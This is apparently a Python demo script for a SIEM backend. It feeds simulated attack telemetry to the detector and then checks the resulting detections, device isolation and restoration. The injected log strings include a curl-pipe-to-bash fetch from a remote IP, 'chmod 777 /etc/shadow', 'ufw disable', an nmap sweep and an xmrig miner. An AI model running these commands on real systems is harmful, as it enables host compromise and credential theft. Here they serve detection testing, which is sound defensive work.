#!/usr/bin/env python3
"""
Sentinel SIEM - Interactive Real-Time Sandbox Simulation Runner
Demonstrates:
  - System Bootstrapping & IAM Authentication
  - Fleet Token Minting & Universal Endpoint Registration
  - Real-time Telemetry & Process Ingestion
  - Multi-Vector Attack Simulation:
      * Network Attack: Credential Brute-Force, Nmap Port Scan, 75MB Data Exfiltration Burst
      * Internal Host Attack: Privilege Escalation (/etc/shadow), Reverse Shell, UFW Firewall Disable, Cryptominer (xmrig)
  - Instant AI Threat Detection Engine & Dynamic MITRE ATT&CK Mapping
  - Real-Time Risk Score Posture Shift (SECURE -> CRITICAL)
  - 1-Click Quarantine: Device Isolation & Strict 403 Network Boundary Enforcement
  - Incident Remediation & Safe Device Recovery
"""

import asyncio
import sys
import os
from datetime import datetime, timezone, timedelta
import httpx
from httpx import ASGITransport

# Add backend directory to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from app.main import app
from app.database.connection import Database
from app.services.ai_engine import AIEngine
from app.auth.security import get_password_hash

# Terminal styling
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

def banner():
    print(f"""
{CYAN}{BOLD}========================================================================
   🛡️  SENTINEL SIEM — FULL SANDBOX ATTACK & DEFENSE SIMULATION  🛡️
========================================================================{RESET}
    """)

def step_header(num: int, title: str):
    print(f"\n{CYAN}{BOLD}[STEP {num}] {title}{RESET}")
    print(f"{DIM}{'-' * 70}{RESET}")

async def run_simulation():
    banner()
    await Database.connect_db()
    db = Database.db

    # Clean in-memory AI baseline sliding windows
    AIEngine._failed_logins.clear()
    AIEngine._metric_baselines.clear()

    # Ensure admin user
    await db.users.update_one(
        {"username": "admin"},
        {"$set": {
            "password_hash": get_password_hash("admin"),
            "role": "admin",
            "must_change_password": False
        }},
        upsert=True
    )

    transport = ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:

        # --- STEP 1: IAM Authentication ---
        step_header(1, "IAM Authentication & Admin Session Minting")
        login_res = await client.post("/api/v1/auth/login", data={"username": "admin", "password": "admin"})
        assert login_res.status_code == 200
        admin_token = login_res.json()["access_token"]
        admin_headers = {"Authorization": f"Bearer {admin_token}"}
        print(f" {GREEN}✓{RESET} Admin authenticated successfully.")
        print(f"   {DIM}JWT Bearer Token issued (TTL: 60m){RESET}")

        me_res = await client.get("/api/v1/auth/me", headers=admin_headers)
        assert me_res.status_code == 200
        print(f" {GREEN}✓{RESET} User Profile: Username={me_res.json()['username']} | Role={me_res.json()['role']}")

        # Operator Registration validation
        reg_res = await client.post("/api/v1/auth/register", json={
            "username": "soc_analyst_demo",
            "password": "Password123!",
            "role": "analyst"
        })
        assert reg_res.status_code == 201
        print(f" {GREEN}✓{RESET} Operator registration verified: {CYAN}soc_analyst_demo{RESET} (Role: analyst)")

        # --- STEP 2: Fleet Enrollment ---
        step_header(2, "Fleet Enrollment Token Minting & Device Registration")
        token_res = await client.post("/api/v1/enrollment/token?reusable=true&days_valid=14", headers=admin_headers)
        assert token_res.status_code == 200
        enroll_token = token_res.json()["token"]
        print(f" {GREEN}✓{RESET} Generated Enrollment Token: {YELLOW}{enroll_token}{RESET}")

        target_host = "FINANCE-STATION-01"
        target_ip = "192.168.10.88"
        target_mac = "52:54:00:88:99:AA"

        reg_res = await client.post("/api/v1/enrollment/register", json={
            "token": enroll_token,
            "hostname": target_host,
            "os": "linux",
            "mac_address": target_mac,
            "ip_address": target_ip
        })
        assert reg_res.status_code == 200
        device_id = reg_res.json()["device_id"]
        dev_token = reg_res.json()["device_credential"]
        dev_headers = {"Authorization": f"Bearer {dev_token}"}
        print(f" {GREEN}✓{RESET} Device Registered: ID={CYAN}{device_id}{RESET} | Hostname={target_host} ({target_ip})")
        print(f"   {DIM}Device mutual authentication credential established.{RESET}")

        # --- STEP 3: Baseline Telemetry ---
        step_header(3, "Ingesting Baseline Telemetry & Normal Process Snapshots")
        now = datetime.now(timezone.utc)
        hb = await client.post("/api/v1/agent/heartbeat", headers=dev_headers, json={
            "device_id": device_id,
            "timestamp": now.isoformat(),
            "status": "online"
        })
        assert hb.status_code == 200
        print(f" {GREEN}✓{RESET} Online Heartbeat received. Device status verified: {GREEN}ONLINE{RESET}")

        metrics_res = await client.post("/api/v1/agent/metrics", headers=dev_headers, json={
            "device_id": device_id,
            "metrics": [{
                "timestamp": now.isoformat(),
                "device_id": device_id,
                "cpu_percent": 14.2,
                "memory_percent": 28.5,
                "memory_used_mb": 2300,
                "memory_total_mb": 8192,
                "disk_percent": 38.0,
                "network_tx_bytes": 512 * 1024,
                "network_rx_bytes": 1024 * 1024
            }]
        })
        assert metrics_res.status_code == 200
        print(f" {GREEN}✓{RESET} Baseline Host Metrics: CPU 14.2% | Memory 28.5% | Disk 38.0%")

        # --- STEP 4: Network Attack Simulation ---
        step_header(4, "SIMULATING NETWORK ATTACK (External Infiltration & Recon)")
        print(f" {YELLOW}⚡ Executing Attack Vector 1:{RESET} High-Frequency SSH Credential Brute-Force Spray (MITRE T1110)")
        ssh_logs = [
            {
                "timestamp": now.isoformat(),
                "device_id": device_id,
                "os": "linux",
                "source_type": "journald",
                "source": "sshd",
                "event_id": "sshd",
                "event_type": "security",
                "severity": "error",
                "message": f"Failed password for invalid user root from 185.220.101.55 port {50100 + i} ssh2",
                "raw_log": f"sshd[{2000+i}]: Failed password for invalid user root from 185.220.101.55"
            }
            for i in range(4)
        ]
        await client.post("/api/v1/agent/logs", headers=dev_headers, json={"device_id": device_id, "logs": ssh_logs})
        print(f"   {RED}→ 4 consecutive failed logins injected from 185.220.101.55{RESET}")

        print(f" {YELLOW}⚡ Executing Attack Vector 2:{RESET} Network Service Discovery Scanner (MITRE T1046)")
        await client.post("/api/v1/agent/processes", headers=dev_headers, json={
            "device_id": device_id,
            "processes": [
                {"pid": 410, "name": "nmap", "cpu_percent": 22.0, "memory_percent": 2.1, "executable": "/usr/bin/nmap -sS -p 1-65535 192.168.10.0/24"}
            ]
        })
        print(f"   {RED}→ Unauthorized nmap SYN port sweep detected in process tree{RESET}")

        print(f" {YELLOW}⚡ Executing Attack Vector 3:{RESET} Network Data Exfiltration Burst (MITRE T1048)")
        await client.post("/api/v1/agent/metrics", headers=dev_headers, json={
            "device_id": device_id,
            "metrics": [{
                "timestamp": now.isoformat(),
                "device_id": device_id,
                "cpu_percent": 30.0,
                "memory_percent": 35.0,
                "memory_used_mb": 2800,
                "memory_total_mb": 8192,
                "disk_percent": 38.0,
                "network_tx_bytes": 80 * 1024 * 1024,  # 80 MB burst
                "network_rx_bytes": 1024 * 1024
            }]
        })
        print(f"   {RED}→ 80 MB outbound burst transmitted over alternative protocol{RESET}")

        # --- STEP 5: Internal Host Attack Simulation ---
        step_header(5, "SIMULATING INTERNAL SYSTEM ATTACK (Host Compromise & Privilege Escalation)")
        print(f" {YELLOW}⚡ Executing Attack Vector 4:{RESET} Sensitive Security File Tampering (MITRE T1548)")
        priv_logs = [{
            "timestamp": now.isoformat(),
            "device_id": device_id,
            "os": "linux",
            "source_type": "auditd",
            "source": "sudo",
            "event_id": "EXECVE",
            "event_type": "security",
            "severity": "critical",
            "message": "sudo chmod 777 /etc/shadow executed by compromised web user",
            "raw_log": "type=EXECVE a0=\"sudo\" a1=\"chmod\" a2=\"777\" a3=\"/etc/shadow\""
        }]
        await client.post("/api/v1/agent/logs", headers=dev_headers, json={"device_id": device_id, "logs": priv_logs})
        print(f"   {RED}→ Unauthorized permission modification on /etc/shadow{RESET}")

        print(f" {YELLOW}⚡ Executing Attack Vector 5:{RESET} Remote Reverse Shell Execution (MITRE T1059)")
        shell_logs = [{
            "timestamp": now.isoformat(),
            "device_id": device_id,
            "os": "linux",
            "source_type": "bash",
            "source": "bash",
            "event_id": "REVERSE_SHELL",
            "event_type": "security",
            "severity": "critical",
            "message": "curl http://194.26.29.112/stage2.sh | bash",
            "raw_log": "bash -c 'curl http://194.26.29.112/stage2.sh | bash'"
        }]
        await client.post("/api/v1/agent/logs", headers=dev_headers, json={"device_id": device_id, "logs": shell_logs})
        print(f"   {RED}→ Piped execution payload spawned interactive shell to remote C2{RESET}")

        print(f" {YELLOW}⚡ Executing Attack Vector 6:{RESET} Defense Evasion / Host Firewall Teardown (MITRE T1562)")
        fw_logs = [{
            "timestamp": now.isoformat(),
            "device_id": device_id,
            "os": "linux",
            "source_type": "systemctl",
            "source": "ufw",
            "event_id": "FIREWALL_STOPPED",
            "event_type": "security",
            "severity": "high",
            "message": "ufw disable executed; packet filtering disabled",
            "raw_log": "systemd[1]: ufw disable executed"
        }]
        await client.post("/api/v1/agent/logs", headers=dev_headers, json={"device_id": device_id, "logs": fw_logs})
        print(f"   {RED}→ Host defense disabled (ufw disable){RESET}")

        print(f" {YELLOW}⚡ Executing Attack Vector 7:{RESET} Cryptojacking Miner Process & CPU Spike (MITRE T1496)")
        await client.post("/api/v1/agent/processes", headers=dev_headers, json={
            "device_id": device_id,
            "processes": [
                {"pid": 666, "name": "xmrig", "cpu_percent": 98.5, "memory_percent": 18.0, "executable": "/tmp/.systemd-private/xmrig"}
            ]
        })
        print(f"   {RED}→ Cryptominer daemon 'xmrig' active at 98.5% CPU{RESET}")

        # --- STEP 6: AI Threat Center Real-Time Analysis ---
        step_header(6, "AI SECURITY POSTURE & THREAT CLASSIFICATION RESULTS")
        stats_res = await client.get("/api/v1/anomalies/stats", headers=admin_headers)
        stats = stats_res.json()

        print(f" {BOLD}AI Security Posture:{RESET} {RED}{BOLD}{stats['posture']}{RESET}")
        print(f" {BOLD}Calculated Risk Score:{RESET} {RED}{BOLD}{stats['risk_score']}/100{RESET}")
        print(f" {BOLD}Active Threats Flagged:{RESET} {YELLOW}{stats['active_threats']}{RESET} (Critical: {RED}{stats['critical_threats']}{RESET}, High: {YELLOW}{stats['high_threats']}{RESET})")
        print(f"\n {BOLD}MITRE ATT&CK Tactic Distribution:{RESET}")
        for item in stats.get("mitre_distribution", []):
            print(f"   • {item['tactic']}: {CYAN}{item['count']}{RESET} detection(s)")

        threats_res = await client.get("/api/v1/anomalies?status=active", headers=admin_headers)
        anomalies = threats_res.json()["anomalies"]
        print(f"\n {BOLD}Detected Incident Log (First 4 Incidents):{RESET}")
        for a in anomalies[:4]:
            print(f"   [{RED}{a['severity'].upper()}{RESET}] [{CYAN}{a['mitre_id']}{RESET}] {a['title']}")
            print(f"      {DIM}Root Cause: {a['root_cause'][:90]}...{RESET}")

        # --- STEP 7: Incident Response — Device Isolation ---
        step_header(7, "INCIDENT RESPONSE: 1-CLICK QUARANTINE & ISOLATION ENFORCEMENT")
        iso_res = await client.post(f"/api/v1/devices/{device_id}/isolate", headers=admin_headers)
        assert iso_res.status_code == 200
        print(f" {GREEN}✓{RESET} Device Isolation Triggered: {RED}{BOLD}STATUS = ISOLATED{RESET}")

        # Verify device status
        dev_stat = await client.get(f"/api/v1/devices/{device_id}", headers=admin_headers)
        assert dev_stat.json()["status"] == "isolated"
        print(f" {GREEN}✓{RESET} SIEM Fleet Database: Device marked as {RED}QUARANTINED / ISOLATED{RESET}")

        print(f"\n {BOLD}Verifying Network Boundary Enforcement (Zero-Trust Severance):{RESET}")
        # Test heartbeat rejection
        blocked_hb = await client.post("/api/v1/agent/heartbeat", headers=dev_headers, json={
            "device_id": device_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "status": "online"
        })
        print(f"   Attempt Heartbeat: HTTP {blocked_hb.status_code} ({RED}{blocked_hb.json()['detail']}{RESET})")
        assert blocked_hb.status_code == 403

        # Test log ingestion rejection
        blocked_logs = await client.post("/api/v1/agent/logs", headers=dev_headers, json={
            "device_id": device_id,
            "logs": ssh_logs[:1]
        })
        print(f"   Attempt Log Stream: HTTP {blocked_logs.status_code} ({RED}{blocked_logs.json()['detail']}{RESET})")
        assert blocked_logs.status_code == 403

        # Test metrics rejection
        blocked_metrics = await client.post("/api/v1/agent/metrics", headers=dev_headers, json={
            "device_id": device_id,
            "metrics": []
        })
        print(f"   Attempt Metrics: HTTP {blocked_metrics.status_code} ({RED}{blocked_metrics.json()['detail']}{RESET})")
        assert blocked_metrics.status_code == 403
        print(f" {GREEN}✓{RESET} Boundary verified: All unauthorized endpoint telemetry strictly blocked with HTTP 403.")

        # --- STEP 8: Threat Remediation & Safe Restoration ---
        step_header(8, "INCIDENT REMEDIATION & SAFE DEVICE RESTORATION")
        # Mark anomalies as resolved
        for a in anomalies:
            await client.post(f"/api/v1/anomalies/{a['_id']}/resolve", headers=admin_headers)
        print(f" {GREEN}✓{RESET} All {len(anomalies)} active threat anomalies remediated and marked {GREEN}RESOLVED{RESET}.")

        restore_res = await client.post(f"/api/v1/devices/{device_id}/restore", headers=admin_headers)
        assert restore_res.status_code == 200
        print(f" {GREEN}✓{RESET} Device Quarantine Lifted: {GREEN}{BOLD}STATUS = ONLINE{RESET}")

        # Verify device heartbeat works again
        resumed_hb = await client.post("/api/v1/agent/heartbeat", headers=dev_headers, json={
            "device_id": device_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "status": "online"
        })
        assert resumed_hb.status_code == 200
        print(f" {GREEN}✓{RESET} Normal agent communication resumed: HTTP 200 OK.")

        # Clean teardown
        await client.delete(f"/api/v1/devices/{device_id}", headers=admin_headers)
        print(f" {GREEN}✓{RESET} Sandbox endpoint cleanly dereferenced and purged.")

    await Database.close_db()
    print(f"""
{GREEN}{BOLD}========================================================================
   🎉 ALL 11 FEATURE SECTORS & ATTACK DEFENSE VECTORS VALIDATED! 🎉
========================================================================{RESET}
    """)

if __name__ == "__main__":
    asyncio.run(run_simulation())
